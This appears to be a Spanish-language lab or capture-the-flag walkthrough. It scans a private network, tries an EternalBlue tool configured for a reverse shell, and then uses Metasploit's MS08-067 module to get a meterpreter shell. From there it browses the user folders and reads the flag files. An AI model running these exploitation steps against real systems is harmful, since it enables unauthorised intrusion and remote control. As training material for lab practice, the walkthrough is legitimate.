
IP local: 10.0.22.4
IP remota: 10.0.22.6
***Abrimos consola***
- netdiscover -r 10.0.22.0/24
	- *Descubrimos que ip sale que no es usual*	
- nmap -p445 --script="smb-vuln-*" 10.0.22.6

- **PROBAMOS EL WIN7BLUE**
- cd /home/user/Desktop/Win7Blue
- chmod +x Win7Blue
- ./Win7Blue
	- $:1
	- RHOST: (Ip remota u del objeto)
- ./Win7Blue
	- $: **4** (o 3, dependiendo de la arquitectura del sistema)
	- RHOST: (ip remota u objetivo)
	- LHOST(ip local, ya sea kali o host usado)
	- LPORT: (puerto en escucha de la consola abierta)
	- *Darle a enter*
- Vemos que no funciona este método, así que recurrimos al otro con el metasploit:


- Buscamos la vulnerabilidad con el comando nmap:
- nmap -p445 --script="smb-vuln-*" 10.0.22.6
- ![[Pasted image 20241009183909.png]]
- searchsploit MS08-067
- ![[Pasted image 20241009183946.png]]
- msfconsole
- search MS08-067
- use 0
- show options
- ![[Pasted image 20241009184040.png]]
-  set rhosts 10.0.22.6
- show options
- ![[Pasted image 20241009184121.png]]
- Exploit:
	- En este caso, no funciona ya que no se puede llegar, así que se hará una modificación de los puertos locales:
	- ![[Pasted image 20241009184247.png]]
- Exploit:
	- De nuevo no funciona, así que le cambiamos de nuevo el puerto:
	- ![[Pasted image 20241009184353.png]]
- Exploit
	- En este caso, ya ha funcionado.
- *Cuando sale el meterpreter:*
- shell
- **En este momento, ya hemos entrado al shell de la máquina vulnerable**
- dir
- dir C:\\![[Pasted image 20241009184547.png]]
- cd C:\\Documents and Settings
- dir C:\\Documents and Settings![[Pasted image 20241009184616.png]]
- cd C:\\Documents and Settings\\bill
- dir C:\\Documents and Settings\\bill![[Pasted image 20241009184654.png]]
- C:\\Documents and Settings\\bill\\Desktop![[Pasted image 20241009184712.png]]
- type root.txt
- type user.txt
- ![[Pasted image 20241009184745.png]]



